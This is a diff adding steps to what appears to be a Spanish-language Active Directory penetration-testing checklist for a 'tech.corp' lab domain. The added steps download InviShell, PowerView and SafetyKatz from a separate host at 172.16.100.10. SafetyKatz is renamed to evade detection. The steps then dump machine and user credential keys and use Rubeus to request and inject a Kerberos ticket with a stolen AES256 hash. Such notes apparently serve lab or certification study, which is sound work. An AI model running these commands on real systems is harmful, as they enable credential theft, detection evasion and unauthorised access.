@@ -59,3 +59,13 @@
 - [ ] `Enter-PSSession -ComputerName mgmtsrv.tech.corp -Authentication Kerberos`
 
 ### Obtener hash de maquina y usuario
+- [ ] `Invoke-WebRequest -Uri "http://172.16.100.10/InviShell.bat" -OutFile "InviShell.bat"`
+- [ ] `Invoke-WebRequest -Uri "http://172.16.100.10/PowerView.ps1" -OutFile "PowerView.ps1"`
+- [ ] Renombraremos SafetyKatz a Safety
+- [ ] `Invoke-WebRequest -Uri "http://172.16.100.10/Safety.exe" -OutFile "Safety.exe"`
+- [ ] `.\Safety.exe "sekurlsa::evasive-keys" "exit"`
+- [ ] Obtenedremos hash de maquina y usuario
+
+### Añadir los hashes a la maquina de atacante CMD system32
+- [ ] `.\Rubeus.exe asktgt /user:techservice /aes256:<hash> /domain:tech.corp /dc:172.16.4.5:88 /show /ptt`
+
